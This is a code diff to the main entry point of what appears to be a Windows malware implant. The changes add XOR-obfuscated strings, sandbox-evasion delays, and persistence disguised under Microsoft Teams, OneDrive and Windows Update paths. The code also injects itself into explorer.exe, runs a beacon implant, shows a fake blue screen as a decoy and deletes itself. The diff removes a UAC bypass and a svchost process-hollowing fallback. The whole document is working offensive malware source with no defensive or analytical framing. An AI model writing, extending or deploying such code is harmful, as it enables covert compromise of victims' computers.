@@ -3,12 +3,12 @@
 #include "evasion/Unhooker.h"
 #include "evasion/Syscalls.h"
 #include "evasion/Injector.h"
-#include "evasion/UACBypass.h"
 #include "evasion/Detection.h"
 #include "decoy/BSOD.h"
 #include "utils/SelfDelete.h"
 #include "utils/Logger.h"
 #include "utils/Shared.h"
+#include "utils/Obfuscator.h"
 #include <windows.h>
 #include <objbase.h>
 #include <vector>
@@ -34,15 +34,34 @@ namespace {
         GetModuleFileNameW(NULL, path, MAX_PATH);
         std::wstring sPath(path);
         std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
-        return (sPath.find(L"explorer.exe") != std::wstring::npos || sPath.find(L"svchost.exe") != std::wstring::npos);
+
+        // "explorer.exe"
+        if (sPath.find(utils::DecryptW(L"\x3f\x22\x2a\x36\x35\x28\x3f\x22\x54\x31\x2c\x31")) != std::wstring::npos) return true;
+        // "svchost.exe"
+        if (sPath.find(utils::DecryptW(L"\x29\x2c\x39\x32\x35\x29\x2e\x54\x31\x2c\x31")) != std::wstring::npos) return true;
+        return false;
+    }
+
+    bool IsRunningFromPersistLocation() {
+        wchar_t path[MAX_PATH];
+        GetModuleFileNameW(NULL, path, MAX_PATH);
+        std::wstring sPath(path);
+        std::transform(sPath.begin(), sPath.end(), sPath.begin(), [](wchar_t c) { return (wchar_t)std::towlower(c); });
+
+        // Basic check for common persist substrings
+        if (sPath.find(L"\\microsoft\\teams\\") != std::wstring::npos) return true;
+        if (sPath.find(L"\\microsoft\\onedrive\\") != std::wstring::npos) return true;
+        if (sPath.find(L"\\microsoft\\windows\\update\\") != std::wstring::npos) return true;
+
+        return false;
     }
 }
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
     (void)hInstance; (void)hPrevInstance; (void)lpCmdLine; (void)nShowCmd;
 
-    // Initial delay to bypass some sandbox/behavioral analysis
-    Sleep(10000 + (GetTickCount() % 20000));
+    // Sandbox/Behavioral delay
+    Sleep(10000 + (GetTickCount() % 15000));
 
     evasion::Unhooker::RefreshNtdll();
     evasion::SyscallResolver::GetInstance();
@@ -51,26 +70,26 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     if (FAILED(hr)) return 1;
 
     if (IsSystemProcess()) {
-        // Foothold instance
-        LOG_INFO("Foothold running.");
+        // Foothold instance (running inside explorer.exe or svchost.exe)
+        LOG_INFO("Foothold active. Installing stealth persistence...");
 
-        // Wait a bit before installing persistence
-        Sleep(30000 + (GetTickCount() % 60000));
+        // Delay persistence install to stay quiet
+        Sleep(45000 + (GetTickCount() % 60000));
 
         std::wstring dropperPath = L"";
         HKEY hKey;
-        if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+        // "Software\\Microsoft\\Windows"
+        if (RegOpenKeyExW(HKEY_CURRENT_USER, utils::DecryptW(L"\x03\x35\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x33\x39\x28\x35\x29\x35\x3c\x20\x0e\x0e\x07\x33\x34\x3e\x35\x23\x29").c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
             wchar_t buf[MAX_PATH];
             DWORD sz = sizeof(buf);
-            if (RegQueryValueExW(hKey, L"UpdatePath", NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
+            // "UpdatePath"
+            if (RegQueryValueExW(hKey, utils::DecryptW(L"\x0f\x2a\x3e\x3b\x2e\x3f\x0a\x3b\x2e\x32").c_str(), NULL, NULL, (LPBYTE)buf, &sz) == ERROR_SUCCESS) {
                 dropperPath = buf;
             }
             RegCloseKey(hKey);
         }
 
-        if (!dropperPath.empty()) {
-            persistence::establishPersistence(dropperPath);
-        }
+        persistence::establishPersistence(dropperPath);
 
         beacon::Beacon implant;
         implant.run();
@@ -79,52 +98,47 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return 0;
     }
 
-    // Dropper instance
-    LOG_INFO("Dropper started.");
+    if (IsRunningFromPersistLocation()) {
+        // Persisted instance (running after reboot)
+        LOG_INFO("Persisted instance running.");
 
-    if (!utils::IsAdmin()) {
-        if (evasion::UACBypass::Execute(GetCommandLineW())) {
-            CoUninitialize();
-            return 0;
-        }
+        beacon::Beacon implant;
+        implant.run();
+
+        CoUninitialize();
+        return 0;
     }
 
-    // More delay before injection
-    Sleep(15000 + (GetTickCount() % 30000));
+    // Dropper instance (first run)
+    LOG_INFO("Dropper started. Relocating to explorer.exe...");
 
     wchar_t selfPath[MAX_PATH];
     GetModuleFileNameW(NULL, selfPath, MAX_PATH);
     HKEY hKey;
-    if (RegCreateKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
-        RegSetValueExW(hKey, L"UpdatePath", 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
+    // "Software\\Microsoft\\Windows"
+    if (RegCreateKeyExW(HKEY_CURRENT_USER, utils::DecryptW(L"\x03\x35\x3c\x20\x23\x35\x24\x31\x0e\x0e\x17\x33\x39\x28\x35\x29\x35\x3c\x20\x0e\x0e\x07\x33\x34\x3e\x35\x23\x29").c_str(), 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
+        // "UpdatePath"
+        RegSetValueExW(hKey, utils::DecryptW(L"\x0f\x2a\x3e\x3b\x2e\x3f\x0a\x3b\x2e\x32").c_str(), 0, REG_SZ, (LPBYTE)selfPath, (DWORD)(wcslen(selfPath) + 1) * sizeof(wchar_t));
         RegCloseKey(hKey);
     }
 
     std::vector<uint8_t> selfImage = GetSelfImage();
     if (!selfImage.empty()) {
         if (evasion::Injector::InjectIntoExplorer(selfImage)) {
+            LOG_INFO("Relocation successful. Cleaning up.");
             decoy::ShowBSOD();
             CoUninitialize();
             utils::SelfDeleteAndExit();
             return 0;
-        } else {
-            Sleep(10000);
-            wchar_t systemPath[MAX_PATH];
-            GetSystemDirectoryW(systemPath, MAX_PATH);
-            std::wstring svchost = std::wstring(systemPath) + L"\\svchost.exe";
-            if (evasion::Injector::HollowProcess(svchost, selfImage)) {
-                decoy::ShowBSOD();
-                CoUninitialize();
-                utils::SelfDeleteAndExit();
-                return 0;
-            }
         }
     }
 
+    // If injection failed, try user-level persistence directly (last resort)
+    LOG_WARN("Relocation failed. Attempting direct persistence.");
     persistence::establishPersistence();
     decoy::ShowBSOD();
+
     CoUninitialize();
     utils::SelfDeleteAndExit();
-
     return 0;
 }
